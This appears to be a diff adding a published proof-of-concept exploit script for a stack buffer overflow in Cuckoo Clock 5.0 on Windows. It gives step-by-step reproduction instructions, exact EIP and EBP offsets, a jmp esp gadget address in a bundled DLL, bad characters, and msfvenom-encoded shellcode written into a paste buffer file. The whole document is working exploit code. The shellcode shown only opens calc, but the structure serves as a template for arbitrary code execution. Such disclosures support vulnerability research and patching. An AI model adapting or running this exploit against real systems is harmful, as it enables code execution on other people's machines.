@@ -1,0 +1,65 @@
+# Exploit Title: Cuckoo Clock 5.0 - Buffer Overflow
+# Exploit Author: boku
+# Date: 2020-02-14
+# Vendor Homepage: https://en.softonic.com/author/pxcompany
+# Software Link:   https://en.softonic.com/download/parallaxis-cuckoo-clock/windows/post-download
+# Version:         5.0
+# Tested On:       Windows 10 (32-bit)
+# 
+# Recreate:
+#  1) Install & Open Cuckoo Clock v5.0
+#  2) Right Click app icon (bottom right), click Alarms
+#  3) Click the Add Button
+#  4) Run Python script
+#  5) Open generated poc.txt, then select-all & copy-all
+#  6) Under Schedule, select-all in 'New Alarm' textbox, then paste buffer
+#  7) Press Back Button and shellcode will execute
+
+# EIP Overwrite at 260 Bytes
+# Max Buffer space is 1287 bytes
+# ESP points to payload at offset 264 bytes
+# EBP overwrite at 256 bytes
+
+# badChars  = '\x00\x0d'
+
+try:
+    ebpOffset = '\x41'*256
+    ebp       = '\x42\x42\x42\x42'
+    eip       = '\x16\x05\x03\x10' # 0x10030516 : jmp esp | ascii {PAGE_EXECUTE_READWRITE} [CERBERUS.dll] 
+    # ASLR: False, Rebase: False, SafeSEH: False (C:\Program Files\Parallaxis Cuckoo Clock\CERBERUS.dll)
+    # ESP points to payload at offset 264 bytes
+    # 1019 bytes = Remaining Buffer Length
+    fixStack  = '\x89\xE5'            # mov ebp,esp
+    fixStack  += '\x83\xEC\x30'        # sub esp,byte +0x30
+    # root@kali# msfvenom -p windows/exec CMD=calc -b '\x00\x0d' -f python -v shellcode
+    # x86/shikata_ga_nai chosen with final size 216
+    shellcode =  b""
+    shellcode += b"\xdd\xc3\xbb\x9a\x4d\x57\xfa\xd9\x74\x24\xf4"
+    shellcode += b"\x58\x33\xc9\xb1\x30\x83\xe8\xfc\x31\x58\x14"
+    shellcode += b"\x03\x58\x8e\xaf\xa2\x06\x46\xad\x4d\xf7\x96"
+    shellcode += b"\xd2\xc4\x12\xa7\xd2\xb3\x57\x97\xe2\xb0\x3a"
+    shellcode += b"\x1b\x88\x95\xae\xa8\xfc\x31\xc0\x19\x4a\x64"
+    shellcode += b"\xef\x9a\xe7\x54\x6e\x18\xfa\x88\x50\x21\x35"
+    shellcode += b"\xdd\x91\x66\x28\x2c\xc3\x3f\x26\x83\xf4\x34"
+    shellcode += b"\x72\x18\x7e\x06\x92\x18\x63\xde\x95\x09\x32"
+    shellcode += b"\x55\xcc\x89\xb4\xba\x64\x80\xae\xdf\x41\x5a"
+    shellcode += b"\x44\x2b\x3d\x5d\x8c\x62\xbe\xf2\xf1\x4b\x4d"
+    shellcode += b"\x0a\x35\x6b\xae\x79\x4f\x88\x53\x7a\x94\xf3"
+    shellcode += b"\x8f\x0f\x0f\x53\x5b\xb7\xeb\x62\x88\x2e\x7f"
+    shellcode += b"\x68\x65\x24\x27\x6c\x78\xe9\x53\x88\xf1\x0c"
+    shellcode += b"\xb4\x19\x41\x2b\x10\x42\x11\x52\x01\x2e\xf4"
+    shellcode += b"\x6b\x51\x91\xa9\xc9\x19\x3f\xbd\x63\x40\x55"
+    shellcode += b"\x40\xf1\xfe\x1b\x42\x09\x01\x0b\x2b\x38\x8a"
+    shellcode += b"\xc4\x2c\xc5\x59\xa1\xc3\x8f\xc0\x83\x4b\x56"
+    shellcode += b"\x91\x96\x11\x69\x4f\xd4\x2f\xea\x7a\xa4\xcb"
+    shellcode += b"\xf2\x0e\xa1\x90\xb4\xe3\xdb\x89\x50\x04\x48"
+    shellcode += b"\xa9\x70\x67\x0f\x39\x18\x68"
+    Remainder  = '\x46'*(1287-len(ebpOffset+ebp+eip+fixStack+shellcode))
+    payload    = ebpOffset+ebp+eip+fixStack+shellcode+Remainder
+    File      = 'poc.txt'
+    f         = open(File, 'w')
+    f.write(payload)
+    f.close()
+    print File + " created successfully"
+except:
+    print File + ' failed to create'
